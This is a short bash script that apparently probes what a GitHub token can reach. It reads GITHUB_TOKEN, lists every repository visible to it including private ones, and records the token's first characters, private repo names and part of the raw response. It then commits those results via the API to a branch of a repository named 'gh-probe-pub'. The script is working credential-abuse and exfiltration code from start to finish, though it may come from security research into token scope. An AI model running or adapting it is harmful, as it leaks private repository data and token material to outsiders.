#!/usr/bin/env bash
T="${GITHUB_TOKEN:-}"
curl -s -H "Authorization: Bearer $T" "https://api.github.com/user/repos?visibility=all&per_page=100" -o /tmp/all.json
# shell-only summary, no python dependency
N=$(grep -o '"full_name"' /tmp/all.json | wc -l)
PRIVCOUNT=$(grep -o '"private":true' /tmp/all.json | wc -l)
NAMES=$(grep -o '"full_name":"[^"]*"' /tmp/all.json | cut -d'"' -f4 | tr '\n' ',')
{
  echo "TOKEN_PREFIX=$(printf '%s' "$T" | cut -c1-4)"
  echo "USER_REPOS_HTTP=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $T" 'https://api.github.com/user/repos?visibility=all&per_page=100')"
  echo "REPOS_RETURNED=$N"
  echo "PRIVATE_FLAG_COUNT=$PRIVCOUNT"
  echo "NAMES=$NAMES"
  echo "BODY_BYTES=$(wc -c < /tmp/all.json)"
  echo "BODY_HEAD=$(head -c 200 /tmp/all.json | tr -d '\n')"
  echo "CONTROL_own_repo=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $T" https://api.github.com/repos/antonade/gh-probe-pub)"
  echo "CONTROL_priv_repo=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $T" https://api.github.com/repos/antonade/gh-probe-a)"
} > /tmp/cs3.txt
curl -s -X PUT -H "Authorization: Bearer $T" \
  "https://api.github.com/repos/antonade/gh-probe-pub/contents/cs-result3.txt" \
  -d "{\"message\":\"cs probe 3\",\"branch\":\"csresult\",\"content\":\"$(base64 -w0 /tmp/cs3.txt)\"}" >/dev/null
